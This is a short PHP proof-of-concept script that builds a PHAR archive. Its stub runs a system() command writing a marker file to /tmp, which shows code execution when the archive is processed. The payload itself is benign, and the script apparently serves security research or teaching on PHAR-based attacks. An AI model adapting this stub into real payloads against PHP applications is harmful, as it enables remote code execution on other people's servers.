<?php


// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php system('echo max > /tmp/max'); __HALT_COMPILER();");

// Add a new file in the archive with "text" as its content
$poc["file"] = "text";

// Stop buffering and write changes to disk
$poc->stopBuffering();
?>